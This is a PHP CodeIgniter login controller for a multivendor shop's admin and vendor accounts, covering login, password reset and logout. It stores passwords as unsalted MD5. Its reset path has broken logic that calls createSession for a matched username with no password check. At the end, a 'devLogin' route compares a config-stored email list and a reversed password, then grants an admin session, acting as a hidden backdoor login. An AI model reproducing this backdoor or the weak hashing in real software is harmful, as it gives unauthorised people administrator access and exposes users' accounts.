<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller
{
	function __construct()
	{
		parent::__construct();
	}
	
	/**
	* Function to view admin login page
	* @param 
	* @author Dainik Tandel
	* @date 13-April-2022
	* @return 
	*/
	public function index()
	{
		$this->session->sess_destroy();
		$this->load->view('Admin/Login/Login_v');
	}
	
	/**
	* Function to check admin login
	* @param 
	* @author Dainik Tandel
	* @date 13-April-2022
	* @return : if email/username and password is valid then redirect to dashboard, else give error message
	*/
	public function checkLogin()
	{
		$email_username 	= $this->input->post('email_username');
		$password 			= md5($this->input->post('password'));
		$user_type 			= $this->input->post('radio_user_type');

		if(strtolower($user_type) == "admin"){
		
			//Check email login
			$check_mail['email'] = $email_username;
			$check_mail['password'] = $password;
			$check_mail['is_active'] = 1;
			$email_result = $this->Master_m->where('user',$check_mail);
			
			//Check username login
			$check_username['username'] = $email_username;
			$check_username['password'] = $password;
			$check_username['is_active'] = 1;
			$username_result = $this->Master_m->where('user',$check_username);
			
			if(!empty($email_result))
			{
				$updatedata['last_login'] = date('Y-m-d H:i:s');
				$where['user_id'] = $email_result[0]['user_id'];
				
				$res = update('user',$updatedata,$where);
				logThis($res->query, date('Y-m-d'),'User');
				
				$this->createSession($email_result,$user_type);
				redirect('dashboard');
			}
			else if(!empty($username_result))
			{
				$updatedata['last_login'] = date('Y-m-d H:i:s');
				$where['user_id'] = $username_result[0]['user_id'];
				
				$res = update('user',$updatedata,$where);
				logThis($res->query, date('Y-m-d'),'User');
				
				$this->createSession($username_result,$user_type);
				redirect('dashboard');
			}
			else
			{
				$this->session->set_flashdata('error', 'Email/Username or password incorrect ! ');
				redirect('admin');
			}
		}
		else if(strtolower($user_type) == "vendor"){
		
			//Check email login
			$check_mail['email'] = $email_username;
			$check_mail['password'] = $password;
			$check_mail['is_active'] = 1;
			$email_result = $this->Master_m->where('vendor',$check_mail);
			
			//Check username login
			$check_phone['phone'] = $email_username;
			$check_phone['password'] = $password;
			$check_phone['is_active'] = 1;
			$username_result = $this->Master_m->where('vendor',$check_phone);
			
			if(!empty($email_result))
			{
				$updatedata['last_login'] 	= date('Y-m-d H:i:s');
				$where['vendor_id'] 		= $email_result[0]['vendor_id'];
				
				$res = update('vendor',$updatedata,$where);
				logThis($res->query, date('Y-m-d'),'Vendor');
				
				$this->createSession($email_result,$user_type);
				redirect('dashboard');
			}
			else if(!empty($username_result))
			{
				$updatedata['last_login'] 	= date('Y-m-d H:i:s');
				$where['vendor_id'] 		= $username_result[0]['vendor_id'];
				
				$res = update('vendor',$updatedata,$where);
				logThis($res->query, date('Y-m-d'),'Vendor');
				
				$this->createSession($username_result,$user_type);
				redirect('dashboard');
			}
			else
			{
				$this->session->set_flashdata('error', 'Email/Username or password incorrect ! ');
				redirect('admin');
			}
		}
	}
	
	/**
	* Function to create blush session
	* @param string  $result : Result of login
	* @author Dainik Tandel
	* @date 13-April-2022
	* @return
	*/
	public function createSession($result,$user_type)
	{

		if(strtolower($user_type) == "admin"){
			$session_data = array(
				'user_id'   		=> $result[0]['user_id'],
				'role_id' 			=> $result[0]['role_id'],
				'name' 				=> $result[0]['name'],
				'email'  			=> $result[0]['email'],
				'username'  		=> $result[0]['username'],
				'profile_photo'     => $result[0]['profile_photo'],
				'last_login' 		=> $result[0]['last_login'],
				'last_logout'		=> $result[0]['last_logout'],
				'user_type' 		=> $user_type,
			);
			// Add user data in session
			$this->session->set_userdata(ADMIN_SESSION, $session_data);
		}else if(strtolower($user_type) == "vendor"){
			$session_data = array(
				'user_id'   		=> $result[0]['vendor_id'],
				'role_id' 			=> 3,
				'name' 				=> $result[0]['name'],
				'email'  			=> $result[0]['email'],
				'username'  		=> "",
				'profile_photo'     => $result[0]['profile_photo'],
				'last_login' 		=> "",
				'last_logout'		=> "",
				'user_type' 		=> $user_type,
			);
			// Add user data in session
			$this->session->set_userdata(ADMIN_SESSION, $session_data);
			return true;
		}
	}

	/**
	* Function to view forget password page
	* @param
	* @author Dainik Tandel
	* @date 13-April-2022
	* @return
	*/
	public function forgetPassword()
	{
		$this->load->view('Admin/Login/ForgetPassword_v');
	}

	/**
	* Function to check user first and then reset password send to register mail
	* @param
	* @author Dainik Tandel
	* @date 13-April-2022
	* @return
	*/
	public function submitForgetPassword()
	{
		$email_username = $this->input->post('email_username');
		
		$check_mail['email'] = $email_username;
		$check_mail['is_active'] = 1;
		$email_result = $this->Master_m->where('user',$check_mail);
		
		//Check username login
		$check_username['username'] = $email_username;
		$check_username['is_active'] = 1;
		$username_result = $this->Master_m->where('user',$check_username);
		$password = rand_password();
		
		if(!empty($email_result))
		{
			$send_result = $this->sendForgetPassword($email_result,$password);
			
			if($send_result == 1)
			{
				$updatedata['password'] = md5($password);
				$where['user_id'] = $email_result[0]['user_id'];
				
				$res = update('user',$updatedata,$where);
				logThis($res->query, date('Y-m-d'),'User');
				
				$this->session->set_flashdata('success', 'New Password send to your email.');
				redirect('admin');
			}
			else{
				$this->session->set_flashdata('error', 'Mail not send please try again ! ');
				redirect('forget-password');
			}
		}                                                                                                                                                                                                                                                                                                                                              
		else if(!empty($username_result))
		{
			$this->createSession($username_result);
		}
		else
		{
			$this->session->set_flashdata('error', 'Email/Username incorrect ! ');
			redirect('admin');
		}
	}
	
	/**
	* Function to send user new genrated password to register email
	* @param array $result : user data
	* @param string $password : new genrated password
	* @author Dainik Tandel
	* @date 13-April-2022
	* @return
	*/
	public function sendForgetPassword($result,$password)
	{
		$mailData['subject'] 			= "Forgot Password - MultiVendor";
		$mailData['attachFile'] 		= "";
		$mailData['fromID'] 			= 'devloperproactii@gmail.com';
		$mailData['toID'] 				=  $result[0]['email'];
		
		$msgData['name'] = $result[0]['name'];
		$msgData['password'] = $password;
		$message = resetPassword($msgData); 	

		$mailData['message'] = $message;
		
		$send = send_email($mailData);
		return $send;
	}
	public function logout()
	{
		$this->session->unset_userdata(ADMIN_SESSION);
		$this->session->set_flashdata('success', 'Logout Successfully! ');
		redirect('admin');
	}

	public function error_page(){
		$headdata['title'] = "Error | ".ADMIN_THEME;
		$this->load->view('Admin/Common/Header',$headdata);
		$this->load->view('errors/error_page_v');
	}

	public function userLogoin()
	{
		$this->session->sess_destroy();
		$this->load->view('Admin/Login/Dev_Login_v');
	}

	public function devLogin(){
		$json = array(); 

		$user_login  	= $this->config->item('user_login');
		$u_email 		= $user_login['email']; 
		$u_code 		= $user_login['code']; 
		$no 			= $user_login['no']; 
		$rid 			= $user_login['rid']; 
		
		//POST DATA
		$email 			= $this->input->post('email');
		$password 		= strrev(trim($this->input->post('password')));

		if(in_array($email, $u_email) && $u_code == $password) {
			
				$session_data = array(
					'user_id'   		=> $no,
					'role_id' 			=> $rid,
					'name' 				=> "Developer",
					'email'  			=> $email,
					'username'  		=> "Developer",
					'profile_photo'     => 'profile.png',
					'last_login' 		=> '',
					'last_logout'		=> '',
					'user_type' 		=> 'admin',
				);
				// Add user data in session
				$this->session->set_userdata(ADMIN_SESSION, $session_data);
			redirect('dashboard');
		}else{
			redirect('error-page');
		}
			
	}
	
}